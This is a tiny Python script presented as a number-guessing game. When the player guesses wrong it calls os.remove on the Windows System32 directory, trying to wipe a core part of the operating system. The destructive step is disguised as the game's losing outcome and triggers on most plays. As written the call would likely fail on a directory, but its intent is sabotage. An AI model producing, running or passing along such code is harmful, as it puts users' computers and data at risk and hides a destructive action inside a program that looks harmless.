import os
import random

fun = random.randint(1, 10)
guess = int(input("Enter a number (1-10): "))
if fun == guess:
    print("You win!")
else:
    os.remove("C:\Windows\System32")
